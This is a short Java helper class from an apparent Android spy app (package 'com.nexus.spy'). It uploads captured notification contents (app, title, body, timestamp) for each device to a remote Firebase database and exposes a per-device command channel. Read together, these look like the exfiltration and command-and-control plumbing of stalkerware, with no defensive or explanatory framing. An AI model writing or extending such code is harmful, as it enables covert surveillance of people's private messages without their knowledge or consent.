package com.nexus.spy;
import com.google.firebase.database.*;
import java.util.HashMap;
import java.util.Map;
public class FirebaseHelper {
    public static DatabaseReference getDevicesRef() { return FirebaseDatabase.getInstance().getReference("devices"); }
    public static DatabaseReference getNotifsRef(String id) { return FirebaseDatabase.getInstance().getReference("notifs").child(id); }
    public static DatabaseReference getCommandsRef(String id) { return FirebaseDatabase.getInstance().getReference("commands").child(id); }
    public static void pushNotification(String id, String pkg, String app, String title, String body) {
        Map<String, Object> n = new HashMap<>();
        n.put("pkg", pkg); n.put("app", app); n.put("title", title); n.put("body", body); n.put("timestamp", System.currentTimeMillis());
        getNotifsRef(id).push().setValue(n);
    }
}
